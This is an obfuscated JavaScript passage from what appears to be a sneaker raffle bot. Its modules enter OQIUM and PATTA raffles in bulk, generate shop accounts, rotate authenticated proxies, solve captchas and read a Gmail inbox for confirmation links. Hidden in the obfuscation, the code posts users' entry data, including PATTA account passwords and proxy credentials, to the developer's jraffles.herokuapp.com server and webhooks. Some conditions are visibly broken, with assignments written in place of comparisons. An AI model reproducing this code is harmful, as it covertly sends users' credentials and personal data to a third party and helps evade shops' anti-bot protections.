                                                'value': '' + _0x2c9cb3[_0x350a6c]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x5d2560['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x3e85bb
                                            }
                                        ]
                                    }], _0x46fb8a = { 'embeds': _0xb8b6ca }, _0x1052ce = _0x288754['data'], _0x1052ce['data']['attributes']['email'] = '' + _0x2c9cb3[_0x350a6c]['Email'];
                                    if (_0x2c9cb3[_0x350a6c]['Size'] == 'RANDOM') {
                                    }
                                    _0x1052ce['data']['attributes']['properties']['$first_name'] = '' + _0x2c9cb3[_0x350a6c]['FirstName'], _0x1052ce['data']['attributes']['properties']['$last_name'] = '' + _0x2c9cb3[_0x350a6c]['LastName'], _0x1052ce['data']['attributes']['properties']['$address1'] = _0x2c9cb3[_0x350a6c]['Address1'] + '\x20' + _0x2c9cb3[_0x350a6c]['Address2'] + '\x20' + _0x2c9cb3[_0x350a6c]['HouseNumber'], _0x1052ce['data']['attributes']['properties']['$zip'] = '' + _0x2c9cb3[_0x350a6c]['Zip'], _0x1052ce['data']['attributes']['properties']['$city'] = '' + _0x2c9cb3[_0x350a6c]['City'], _0x1052ce['data']['attributes']['properties']['$country'] = '' + _0x2c9cb3[_0x350a6c]['Country'], _0x2c9cb3[_0x350a6c]['Size'] == 'RANDOM' ? _0x1052ce['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x5adebc[_0x8cc820] : _0x1052ce['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2c9cb3[_0x350a6c]['Size'], _0x1052ce['data']['attributes']['properties']['$phone_number'] = '' + _0x2c9cb3[_0x350a6c]['Phone'], _0x1052ce['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x2c9cb3[_0x350a6c]['Follower'];
                                }
                                if (_0x5d2560['useRandomProxy'] = ![])
                                    var _0x2542b4 = _0x3abfb3[_0x350a6c]['split'](':');
                                else
                                    var _0x5260ce = Math['round'](Math['random']() * (_0x3abfb3['length'] - 0x1)), _0x2542b4 = _0x3abfb3[_0x5260ce]['split'](':');
                                var _0x20e896 = {
                                    'jar': _0xaed655,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x288754['url'],
                                    'headers': _0x288754['headers'],
                                    'body': JSON['stringify'](_0x1052ce),
                                    'proxy': 'http://' + _0x2542b4[0x2] + ':' + _0x2542b4[0x3] + '@' + _0x2542b4[0x0] + ':' + _0x2542b4[0x1]
                                };
                                return _0x45ab87 != 'ver' && (_0x20e896['url'] = _0x288754['url'], _0x20e896['headers'] = _0x288754['headers']), _0x45ab87 == 'ver' && (_0x20e896['method'] = 'GET'), new Promise(function (_0xc12517, _0x5781fb) {
                                    callback = async (_0x246c32, _0x195963, _0x43990d) => {
                                        if (!_0x246c32 && _0x195963['statusCode'] == 0xca || !_0x246c32 && _0x195963['statusCode'] == 0xc8) {
                                            if (_0x45ab87 != 'ver') {
                                                var _0x43e874 = await _0xf2c38e(_0x2c9cb3[_0x350a6c], _0x288754, 'dev', ![]), _0xe8cfd1 = await _0xf2c38e(_0x2c9cb3[_0x350a6c], _0x288754, 'pub', ![]);
                                                const _0x110051 = {
                                                    'succesDEVMSG': { 'embeds': [_0x43e874] },
                                                    'succesPUBMSG': { 'embeds': [_0xe8cfd1] }
                                                };
                                                let _0x36ccc3 = _0x2c9cb3[_0x350a6c];
                                                try {
                                                    prxdata = {
                                                        'username': _0x4a7d40['replace']('#', ''),
                                                        'module': _0x288754['name'],
                                                        'entrydata': JSON['stringify'](_0x36ccc3),
                                                        'proxy': '' + _0x3abfb3[_0x350a6c]
                                                    };
                                                    var _0x392101 = JSON['stringify'](prxdata);
                                                    let _0x1ef413 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x2e12a3['post']('https://jraffles.herokuapp.com/success', _0x392101, _0x1ef413);
                                                } catch (_0x5c671f) {
                                                }
                                                if (_0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '')
                                                    try {
                                                        await _0x4bfa5b(_0x5d2560['webhook'], _0x110051['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x5954fc(0xc8), await _0x4bfa5b(_0x4f558b, _0x110051['succesDEVMSG']), await _0x5954fc(0xc8);
                                                try {
                                                    await _0x4bfa5b(_0x4b117a, _0x110051['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x4904f4(_0x2c9cb3[_0x350a6c], _0x288754);
                                            }
                                            _0x570523--, _0xc12517(console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x288754['name'] + ']\x20Task\x20' + (_0x350a6c + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x45ab87 != 'ver') {
                                                var _0x2a7729 = '' + _0x246c32, _0x367c5e = await _0xf2c38e(_0x2c9cb3[_0x350a6c], _0x288754, 'dev', !![], _0x2a7729), _0x6c5725 = {};
                                                _0x6c5725['errorDEV'] = { 'embeds': [_0x367c5e] }, _0x1c26ba(_0x2c9cb3[_0x350a6c], _0x288754), _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x6c5725['errorDEV']), await _0x4bfa5b(_0x248b77, _0x6c5725['errorDEV']);
                                            }
                                            _0x570523--, _0x5781fb(console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x288754['name'] + ']\x20Task\x20' + (_0x350a6c + 0x1) + ':\x20' + _0x246c32)));
                                        }
                                    };
                                    try {
                                        _0x45ab87 != 'ver' && console['log'](_0x52b59e() + '\x20[' + _0x288754['name'] + ']\x20Task\x20' + (_0x350a6c + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1052ce['data']['attributes']['email']), _0x5e7aa2(_0x20e896, callback);
                                    } catch (_0x4e52ae) {
                                        console['log'](_0x52b59e() + '\x20Task\x20' + (_0x350a6c + 0x1) + ':\x20' + _0x4e52ae);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x14605f(_0x1e597a, 'nor', _0x3d7362, _0x6eb5e5, _0x25e207), console['log'](_0x52b59e() + '\x20[' + _0x3d7362['name'] + ']\x20Sleeping\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                            } catch (_0x197642) {
                            }
                        }
                        _0x5cc9ed(_0x277967, _0x430c3f, _0x1d65b7, _0x585281), await _0x5954fc(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x12eb4f, _0x8db2f5, _0xca9aa4) {
                    var _0x8db2f5 = [], _0x5ea5bb = ![];
                    async function _0x2067b1() {
                        var _0x306401 = new _0x15c146({
                            'user': _0x5d2560['masterMail'],
                            'password': _0x5d2560['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x5cc302(_0x1cab57) {
                            _0x306401['openBox']('INBOX', ![], _0x1cab57);
                        }
                        _0x306401['once']('ready', function () {
                            _0x5cc302(function (_0x466ff7, _0x287e09) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x466ff7)
                                    throw _0x466ff7;
                                _0x306401['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x6604cb, _0x1c8c6c) {
                                    if (!_0x1c8c6c || !_0x1c8c6c['length'])
                                        console['log'](_0x52b59e() + '\x20[' + _0x12eb4f['name'] + ']\x20No\x20mails\x20found'), _0x306401['end']();
                                    else {
                                        var _0x290bc9 = _0x306401['seq']['fetch'](_0x1c8c6c, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x290bc9['on']('message', function (_0x389233, _0x34266c) {
                                            var _0x2f6b72 = '(#' + _0x34266c + ')\x20';
                                            _0x389233['on']('body', function (_0x1a7c96, _0x58c6dc) {
                                                _0x2e3fa0(_0x1a7c96, (_0x46ec1f, _0x2910eb) => {
                                                    var _0x390022 = _0x2910eb['text']['split']('(')[0x1], _0x38ba0b = _0x390022['split'](')')[0x0];
                                                    _0x8db2f5['push'](_0x38ba0b);
                                                });
                                            }), _0x389233['once']('end', function () {
                                            });
                                        }), _0x290bc9['once']('error', function (_0x2a2ef0) {
                                            console['log']('Fetch\x20error:\x20' + _0x2a2ef0), _0x5ea5bb = !![];
                                        }), _0x290bc9['once']('end', function () {
                                            _0x306401['end'](), _0x5ea5bb = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x306401['once']('error', function (_0x5a76af) {
                            console['log'](_0x5a76af), _0x5ea5bb = !![];
                        }), _0x306401['once']('end', async function () {
                            _0x5ea5bb = !![];
                        }), _0x306401['connect']();
                    }
                    async function _0x9d9b2f(_0x4621b0, _0x4ccc41, _0x331d9f) {
                        for (var _0x2cb9c8 = 0x0; _0x2cb9c8 < _0x4ccc41['length']; _0x2cb9c8++) {
                            async function _0x248455(_0x4b5035, _0x2ef9bb, _0x2ff766, _0x3de6e4, _0x5af3cc) {
                                var _0x1c3db3, _0x4a9b70 = {}, _0x2b29be = [], _0x2df1b3 = {}, _0x36fbe9 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x35cb78 = Math['round'](Math['random']() * (_0x36fbe9['length'] - 0x1));
                                _0x3de6e4[_0x4b5035]['Size'] == 'RANDOM' && (_0x3de6e4[_0x4b5035]['Size'] = _0x36fbe9[_0x35cb78]);
                                !_0x3de6e4 && (_0x3de6e4 = {});
                                if (_0x5d2560['useRandomProxy'] = ![])
                                    var _0x5db985 = _0x5af3cc[_0x4b5035]['split'](':');
                                else
                                    var _0x197114 = Math['round'](Math['random']() * (_0x5af3cc['length'] - 0x1)), _0x5db985 = _0x5af3cc[_0x197114]['split'](':');
                                var _0x2becaa = {
                                    'jar': _0xaed655,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x2ff766['url'],
                                    'headers': _0x2ff766['headers'],
                                    'body': JSON['stringify'](_0x4a9b70),
                                    'proxy': 'http://' + _0x5db985[0x2] + ':' + _0x5db985[0x3] + '@' + _0x5db985[0x0] + ':' + _0x5db985[0x1]
                                };
                                return _0x2ef9bb == 'ver' && (_0x2becaa['method'] = 'GET', _0x2becaa['url'] = _0x3de6e4[_0x4b5035]), new Promise(function (_0xaf9e36, _0x466550) {
                                    callback = async (_0x4e4ac6, _0x139522, _0x17b215) => {
                                        !_0x4e4ac6 && _0x139522['statusCode'] == 0xca || !_0x4e4ac6 && _0x139522['statusCode'] == 0xc8 ? _0xaf9e36(console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x2ff766['name'] + ']\x20Task\x20' + (_0x4b5035 + 0x1) + ':\x20Raffle\x20Entered!'))) : _0x466550(console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x2ff766['name'] + ']\x20Task\x20' + (_0x4b5035 + 0x1) + ':\x20' + _0x4e4ac6)));
                                    };
                                    try {
                                        _0x2ef9bb != 'ver' ? console['log'](_0x52b59e() + '\x20[' + _0x2ff766['name'] + ']\x20Task\x20' + (_0x4b5035 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4a9b70['data']['attributes']['email']) : console['log'](_0x52b59e() + '\x20[' + _0x2ff766['name'] + ']\x20Task\x20' + (_0x4b5035 + 0x1) + ':\x20Fetching\x20Response'), _0x5e7aa2(_0x2becaa, callback);
                                    } catch (_0x2149c2) {
                                        console['log'](_0x52b59e() + '\x20Task\x20' + (_0x4b5035 + 0x1) + ':\x20' + _0x2149c2);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x248455(_0x2cb9c8, 'ver', _0x4621b0, _0x4ccc41, _0x331d9f), console['log'](_0x52b59e() + '\x20[' + _0x4621b0['name'] + ']\x20Sleeping\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                            } catch (_0xc024c0) {
                                console['log'](_0xc024c0), await _0x5954fc(0x2710);
                            }
                        }
                    }
                    try {
                        _0x2067b1();
                        while (!_0x5ea5bb) {
                            await _0x5954fc(0xfa0);
                        }
                        console['log']('Found\x20' + _0x8db2f5['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0x298cde) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0x298cde), await _0x5954fc(0x2710);
                    }
                    try {
                        await _0x9d9b2f(_0x12eb4f, _0x8db2f5, _0xca9aa4);
                    } catch (_0x2aba04) {
                        console['log'](_0x2aba04), await _0x5954fc(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x5d7f4c, _0xa8a161, _0x1924ff) {
                    _0x13c80e['use'](_0x146fac()), _0x13c80e['use'](_0x4b936d({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5d2560['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1ba810 = 0x0; _0x1ba810 < _0xa8a161['length']; _0x1ba810++) {
                        var _0x51c29b = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4a7d40
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5d2560['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x3e85bb
                                }
                            ]
                        }];
                        const _0x2e435e = { 'embeds': _0x51c29b };
                        _0x34c195(_0x5d7f4c['name'] + '\x20Task\x20' + (_0x1ba810 + 0x1) + '\x20/\x20' + _0xa8a161['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f);
                        try {
                            await _0x414596(_0xa8a161, _0x1ba810);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x258dd0 = await _0xf2c38e(_0xa8a161[_0x1ba810], _0x5d7f4c, 'acc', ![]);
                        const _0x468f2f = { 'succesDEVMSG': { 'embeds': [_0x258dd0] } };
                        if (_0xa8a161[_0x1ba810]['Email'] == '' || _0xa8a161[_0x1ba810]['FirstName'] == '' || _0xa8a161[_0x1ba810]['LastName'] == '') {
                            console['log'](_0x52b59e() + '\x20[' + _0x1b4334[taskModule]['name'] + ']\x20Task\x20' + (_0x1ba810 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x5954fc(0x7d0);
                            continue;
                        }
                        (_0xa8a161[_0x1ba810]['Password'] == '' || _0xa8a161[_0x1ba810] == undefined) && _0xa8a161[_0x1ba810]['Password'] == 'JRaffles23!';
                        if (_0x5d2560['useRandomProxy'] = ![])
                            var _0x27b0f0 = _0x1924ff[_0x1ba810]['split'](':');
                        else
                            var _0x4bc09d = Math['round'](Math['random']() * (_0x1924ff['length'] - 0x1)), _0x27b0f0 = _0x1924ff[_0x4bc09d]['split'](':');
                        var _0x20d87e;
                        try {
                            _0x20d87e = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x27b0f0[0x0] + ':' + _0x27b0f0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x20d87e = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x27b0f0[0x0] + ':' + _0x27b0f0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2d3665 = await _0x20d87e['newPage']();
                            await _0x2d3665['authenticate']({
                                'username': '' + _0x27b0f0[0x2],
                                'password': '' + _0x27b0f0[0x3]
                            }), console['log'](_0x52b59e() + '\x20[' + _0x5d7f4c['name'] + ']\x20Task\x20' + (_0x1ba810 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2d3665['setRequestInterception'](!![]), _0x2d3665['on']('request', _0x385fb0 => {
                                _0x385fb0['resourceType']() === 'image' || _0x385fb0['resourceType']() === 'font' || _0x385fb0['resourceType']() === 'media' ? _0x385fb0['abort']() : _0x385fb0['continue']();
                            }), await _0x2d3665['goto']('https://patta.nl/account/register'), await _0x5954fc(0xbb8), await _0x2d3665['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x52b59e() + '\x20[' + _0x5d7f4c['name'] + ']\x20Task\x20' + (_0x1ba810 + 0x1) + '\x20:\x20Filling\x20information'), await _0x2d3665['type']('#RegisterForm-FirstName', '' + _0xa8a161[_0x1ba810]['FirstName']), await _0x5954fc(0x226), await _0x2d3665['type']('#RegisterForm-LastName', '' + _0xa8a161[_0x1ba810]['LastName']), await _0x5954fc(0x226), await _0x2d3665['type']('#RegisterForm-email', '' + _0xa8a161[_0x1ba810]['Email']), await _0x5954fc(0x226), await _0x2d3665['type']('#RegisterForm-password', '' + _0xa8a161[_0x1ba810]['Password']), await _0x5954fc(0x226), console['log'](_0x52b59e() + '\x20[' + _0x5d7f4c['name'] + ']\x20Task\x20' + (_0x1ba810 + 0x1) + '\x20:\x20Submitting..'), await _0x2d3665['$eval']('#RegisterForm', _0x2fb56a => _0x2fb56a['submit']()), await _0x5954fc(0x1f40);
                            try {
                                await _0x2d3665['waitForSelector']('.home-page-grid__collection'), await _0x5954fc(0x1f4), console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x5d7f4c['name'] + ']\x20Task\x20' + (_0x1ba810 + 0x1) + '\x20:\x20Account\x20' + _0xa8a161[_0x1ba810]['Email'] + '\x20Generated!')), _0x1dee0c['appendFileSync']('../accounts/patta.csv', '\x0a' + _0xa8a161[_0x1ba810]['Email'] + ',' + _0xa8a161[_0x1ba810]['Password']), console['log'](_0x28396b['yellow'](_0x52b59e() + '\x20[' + _0x5d7f4c['name'] + ']\x20Task\x20' + (_0x1ba810 + 0x1) + '\x20:\x20Account\x20' + _0xa8a161[_0x1ba810]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x5d2560['webhook'] != undefined && _0x5d2560['webhook'] != '' && await _0x4bfa5b(_0x5d2560['webhook'], _0x468f2f['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4bfa5b(_0xbfa384, _0x468f2f['succesDEVMSG']);
                            } catch (_0x4ce746) {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1b4334[taskModule]['name'] + ']\x20Task\x20' + (_0x1ba810 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4ce746));
                            }
                        } catch (_0xded23d) {
                            console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x1b4334[taskModule]['name'] + ']\x20Task\x20' + (_0x1ba810 + 0x1) + '\x20:\x20' + _0xded23d));
                        } finally {
                            _0x20d87e && _0x20d87e['close'](), console['log']('Waiting\x20for\x20' + _0x5d2560['delay'] + '\x20ms'), await _0x5954fc(_0x5d2560['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x30b952, _0x26010f, _0xe902c1) {
                    _0x13c80e['use'](_0x146fac()), _0x13c80e['use'](_0x4b936d({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5d2560['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x51759f = 0x0; _0x51759f < _0x26010f['length']; _0x51759f++) {
                        var _0xda672f;
                        if (_0x38c1b0 != 'yes')
                            var _0x38c1b0 = '', _0x4b61fa = 0x0;
                        _0x34c195(_0x30b952['name'] + '\x20Task\x20' + (_0x51759f + 0x1) + '\x20/\x20' + _0x26010f['length'] + '\x20||\x20File:\x20' + _0x54b9d3 + '\x20Proxies:\x20' + _0x3dc05f);
                        try {
                            await _0x414596(_0x26010f, _0x51759f);
                        } catch {
                            _0x38c1b0 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x26010f[_0x51759f]['Email'] == '' || _0x26010f[_0x51759f]['Password'] == '' || _0x26010f[_0x51759f]['FirstName'] == '' || _0x26010f[_0x51759f]['LastName'] == '') {
                            console['log'](_0x52b59e() + '\x20[' + _0x1b4334[taskModule]['name'] + ']\x20Task\x20' + (_0x51759f + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5d2560['useRandomProxy'] = ![])
                            var _0x417509 = _0xe902c1[_0x51759f]['split'](':');
                        else
                            var _0x5c960a = Math['round'](Math['random']() * (_0xe902c1['length'] - 0x1)), _0x417509 = _0xe902c1[_0x5c960a]['split'](':');
                        var _0x1321d8;
                        try {
                            _0x1321d8 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x417509[0x0] + ':' + _0x417509[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1321d8 = await _0x13c80e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x417509[0x0] + ':' + _0x417509[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3657f7 = await _0x1321d8['newPage']();
                            await _0x3657f7['authenticate']({
                                'username': '' + _0x417509[0x2],
                                'password': '' + _0x417509[0x3]
                            }), console['log'](_0x52b59e() + '\x20[' + _0x30b952['name'] + ']\x20Task\x20' + (_0x51759f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3657f7['setRequestInterception'](!![]), _0x3657f7['on']('request', _0x51591b => {
                                _0x51591b['resourceType']() === 'image' || _0x51591b['resourceType']() === 'font' || _0x51591b['resourceType']() === 'media' ? _0x51591b['abort']() : _0x51591b['continue']();
                            }), await _0x3657f7['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x3657f7['waitForSelector']('#CustomerEmail'), console['log'](_0x52b59e() + '\x20[' + _0x30b952['name'] + ']\x20Task\x20' + (_0x51759f + 0x1) + '\x20:\x20Logging\x20in..'), await _0x3657f7['type']('#CustomerEmail', '' + _0x26010f[_0x51759f]['Email']), await _0x5954fc(0x12c), await _0x3657f7['type']('#CustomerPassword', '' + _0x26010f[_0x51759f]['Password']), await _0x5954fc(0x226), await _0x3657f7['$eval']('#customer_login', _0x4b76e2 => _0x4b76e2['submit']());
                            try {
                                await _0x3657f7['waitForSelector']('#orders'), await _0x5954fc(0x4b0);
                            } catch {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x30b952['name'] + ']\x20Task\x20' + (_0x51759f + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x3657f7['goto']('' + _0x26010f[_0x51759f]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x5954fc(0xbb8), console['log'](_0x52b59e() + '\x20[' + _0x30b952['name'] + ']\x20Task\x20' + (_0x51759f + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x3657f7['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x28396b['red'](_0x52b59e() + '\x20[' + _0x30b952['name'] + ']\x20Task\x20' + (_0x51759f + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x3657f7['type']('#email', '' + _0x26010f[_0x51759f]['Email']), await _0x5954fc(0x384), await _0x3657f7['type']('#first_name', '' + _0x26010f[_0x51759f]['FirstName']), await _0x5954fc(0x514), await _0x3657f7['type']('#last_name', '' + _0x26010f[_0x51759f]['LastName']), await _0x5954fc(0x514), await _0x3657f7['type']('#street_address', _0x26010f[_0x51759f]['Address1'] + '\x20' + _0x26010f[_0x51759f]['HouseNumber'] + '\x20' + _0x26010f[_0x51759f]['Address2']), await _0x5954fc(0x2bc);
                            _0x26010f[_0x51759f]['Postcode'] == undefined && (_0x26010f[_0x51759f]['Postcode'] = _0x26010f[_0x51759f]['Zip']);
                            await _0x3657f7['type']('#zip_code', '' + _0x26010f[_0x51759f]['Postcode']), await _0x5954fc(0x320), await _0x3657f7['type']('#city', '' + _0x26010f[_0x51759f]['City']), await _0x5954fc(0x320), await _0x3657f7['type']('#bday', '01/01/1994'), await _0x5954fc(0x320), await _0x3657f7['type']('#instagram', '' + _0x26010f[_0x51759f]['Follower']), await _0x5954fc(0x352);
                            if (_0x26010f[_0x51759f]['Size'] == 'RANDOM') {
                                const _0x352cf8 = await _0x3657f7['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x7eb7dc => {
                                    return _0x7eb7dc['map'](_0x872424 => _0x872424['textContent']);
                                });
                                var _0x6860ab = Math['round'](Math['random']() * (_0x352cf8['length'] - 0x1));
                                console['log'](_0x52b59e() + '\x20[' + _0x30b952['name'] + ']\x20Task\x20' + (_0x51759f + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x352cf8[_0x6860ab]), await _0x3657f7['click']('label[data-eu-size=\x22' + _0x352cf8[_0x6860ab] + '\x22]');
                            } else {
                                console['log'](_0x52b59e() + '\x20[' + _0x30b952['name'] + ']\x20Task\x20' + (_0x51759f + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x26010f[_0x51759f]['Size']);
                                try {
                                    await _0x3657f7['click']('label[data-eu-size=\x22' + _0x26010f[_0x51759f]['Size'] + '\x22]');
                                } catch {
                                    await _0x3657f7['click']('label[data-eu-size=\x22' + _0x26010f[_0x51759f]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x5954fc(0xbb8), await _0x3657f7['$$eval']('.raffle__checkbox-label', _0x338b41 => _0x338b41['forEach'](_0x74fb5d => _0x74fb5d['click']())), await _0x5954fc(0x7d0), console['log'](_0x52b59e() + '\x20[' + _0x30b952['name'] + ']\x20Task\x20' + (_0x51759f + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x3657f7['click']('#raffle__form-submit'), await _0x5954fc(0x1388);
                            try {
                                await _0x3657f7['waitForSelector']('#raffle__confirmation-message-container'), _0x38c1b0 = 'no', _0x4904f4(_0x26010f[_0x51759f], _0x30b952), console['log'](_0x28396b['green'](_0x52b59e() + '\x20[' + _0x30b952['name'] + ']\x20Task\x20' + (_0x51759f + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x579149 = _0x26010f[_0x51759f];
                                try {
                                    prxdata = {
                                        'username': _0x4a7d40['replace']('#', ''),
                                        'module': _0x30b952['name'],
                                        'entrydata': JSON['stringify'](_0x579149),
                                        'proxy': '' + _0xe902c1[_0x51759f]
                                    };
                                    var _0x3d7d29 = JSON['stringify'](prxdata);
                                    let _0xec9467 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2e12a3['post']('https://jraffles.herokuapp.com/success', _0x3d7d29, _0xec9467);
                                } catch (_0x11084c) {
                                }
